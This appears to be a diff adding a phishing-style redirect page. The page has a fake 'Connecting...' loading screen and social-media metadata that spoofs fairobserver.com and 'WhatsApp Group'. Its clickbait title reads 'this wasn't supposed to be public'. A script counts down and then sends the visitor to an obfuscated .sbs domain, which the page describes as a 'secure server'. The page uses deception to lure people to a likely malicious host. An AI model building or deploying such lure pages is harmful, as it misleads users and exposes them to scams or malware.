@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+      <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+	<link rel="canonical" href="https://www.fairobserver.com/">
+    <title>Connecting...</title>
+    <meta name="robots" content="index, follow">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <meta property="og:title" content="this wasn’t supposed to be public 🔒">
+    <meta property="og:description" content="Browse trending profiles and discover new updates shared by active users.">
+    <meta property="og:image" content="https://snipboard.io/3tRFvJ.jpg">
+    <meta property="og:url" content="https://www.fairobserver.com/">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="WhatsApp Group">
+    <meta property="fb:app_id" content="124024574287414">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="this wasn’t supposed to be public 🔒">
+    <meta name="twitter:description" content="Browse trending profiles and discover new updates shared by active users.">
+    <meta name="twitter:image" content="https://snipboard.io/3tRFvJ.jpg">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>this wasn’t supposed to be public 🔒</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+
+        /* --- RESET & BASIC STYLE --- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            height: 100%;
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #334155 100%);
+            color: #fff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            overflow: hidden; /* Mencegah scroll bar */
+        }
+
+        .wrap {
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            position: relative;
+        }
+
+        /* --- BACKGROUND PARTICLES --- */
+        .particles {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            z-index: 0;
+        }
+
+        .particle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            animation: float 15s infinite linear;
+        }
+
+        @keyframes float {
+            0% {
+                transform: translateY(100vh) rotate(0deg);
+                opacity: 0;
+            }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% {
+                transform: translateY(-100vh) rotate(720deg);
+                opacity: 0;
+            }
+        }
+
+        /* --- CONTENT LOADER --- */
+        .content {
+            z-index: 1;
+            text-align: center;
+        }
+
+        /* Spinner Animasi */
+        .loader-container {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 30px auto;
+        }
+
+        .loader {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border: 4px solid transparent;
+            border-top-color: #3b82f6;
+            border-right-color: #8b5cf6;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        .loader-inner {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            right: 15px;
+            bottom: 15px;
+            border: 4px solid transparent;
+            border-top-color: #ec4899;
+            border-left-color: #f59e0b;
+            border-radius: 50%;
+            animation: spin-reverse 1.5s linear infinite;
+        }
+
+        .loader-core {
+            position: absolute;
+            top: 35px;
+            left: 35px;
+            right: 35px;
+            bottom: 35px;
+            background: linear-gradient(135deg, #3b82f6, #ec4899);
+            border-radius: 50%;
+            animation: pulse 2s ease-in-out infinite;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes spin-reverse { to { transform: rotate(-360deg); } }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 0.8; }
+            50% { transform: scale(1.1); opacity: 1; }
+        }
+
+        /* Text Styles */
+        .text {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            background: linear-gradient(90deg, #3b82f6, #ec4899, #f59e0b);
+            background-size: 200% auto;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: gradient-shift 3s ease infinite;
+        }
+
+        @keyframes gradient-shift {
+            0% { background-position: 0% center; }
+            50% { background-position: 100% center; }
+            100% { background-position: 0% center; }
+        }
+
+        .subtext {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.6);
+            margin-bottom: 25px;
+        }
+
+        /* Progress Bar */
+        .progress-container {
+            width: 280px;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 0 auto 15px auto;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #3b82f6, #ec4899, #f59e0b);
+            border-radius: 10px;
+            width: 0%;
+            animation: loading 3s ease-in-out forwards;
+            box-shadow: 0 0 20px rgba(59, 130, 246, 0.5);
+        }
+
+        @keyframes loading {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+
+        .percentage {
+            font-size: 16px;
+            font-weight: 600;
+            color: #3b82f6;
+            font-variant-numeric: tabular-nums;
+        }
+
+        /* Redirect Message */
+        .redirect-msg {
+            margin-top: 25px;
+            padding: 12px 24px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 50px;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.7);
+            backdrop-filter: blur(10px);
+            opacity: 0;
+            transform: translateY(10px);
+            animation: fade-in-up 0.5s ease forwards 2s;
+        }
+
+        @keyframes fade-in-up {
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .redirect-msg span {
+            color: #3b82f6;
+            font-weight: 600;
+        }
+
+        /* Responsive Mobile */
+        @media (max-width: 480px) {
+            .loader-container { width: 100px; height: 100px; }
+            .loader-core { top: 28px; left: 28px; right: 28px; bottom: 28px; font-size: 20px; }
+            .text { font-size: 24px; }
+            .progress-container { width: 240px; }
+        }
+    </style>
+</head>
+<body>
+
+  <div class="wrap">
+    <!-- Background Particles (Akan diisi oleh JS) -->
+    <div class="particles" id="particles"></div>
+    
+    <div class="content">
+      <!-- Spinner -->
+      <div class="loader-container">
+        <div class="loader"></div>
+        <div class="loader-inner"></div>
+        <div class="loader-core">🔴</div>
+      </div>
+      
+      <!-- Text Info -->
+      <div class="text">Wait a minute!</div>
+      <div class="subtext">Preparing your exclusive content</div>
+      
+      <!-- Progress Bar -->
+      <div class="progress-container">
+        <div class="progress-bar"></div>
+      </div>
+      
+      <!-- Angka Persen -->
+      <div class="percentage" id="percentage">0%</div>
+      
+      <!-- Pesan Redirect -->
+      <div class="redirect-msg">
+        Redirecting to <span>secure server</span> in <span id="countdown">3</span>s
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // --- 1. Generate Particles Background ---
+    const particlesContainer = document.getElementById('particles');
+    for (let i = 0; i < 50; i++) {
+      const particle = document.createElement('div');
+      particle.className = 'particle';
+      particle.style.left = Math.random() * 100 + '%';
+      particle.style.animationDelay = Math.random() * 15 + 's';
+      particle.style.animationDuration = (Math.random() * 10 + 10) + 's';
+      particlesContainer.appendChild(particle);
+    }
+
+    // --- 2. Animate Percentage Counter (0% ke 100%) ---
+    let percentage = 0;
+    const percentageEl = document.getElementById('percentage');
+    
+    const interval = setInterval(() => {
+      percentage += Math.floor(Math.random() * 3) + 1; // Tambah angka acak
+      if (percentage >= 100) {
+        percentage = 100;
+        clearInterval(interval); // Stop di 100
+      }
+      percentageEl.textContent = percentage + '%';
+    }, 50);
+
+    // --- 3. Countdown Timer (3, 2, 1) ---
+    let countdown = 5;
+    const countdownEl = document.getElementById('countdown');
+    
+    const countdownInterval = setInterval(() => {
+      countdown--;
+      if (countdown <= 0) {
+        clearInterval(countdownInterval);
+      } else {
+        countdownEl.textContent = countdown;
+      }
+    }, 1000);
+
+    // --- 4. Redirect ke Link Tujuan ---
+    // GANTI URL DI BAWAH INI DENGAN LINK TUJUAN ANDA
+    const targetUrl = "https://AA8zDZ4.gemblong.sbs/AtT8RMCcXog4aSH0ZxMv"; 
+
+    setTimeout(function () {
+      window.location.href = targetUrl;
+    }, 5000); // Waktu delay 5 detik
+  </script>
+
+</body>
+</html>
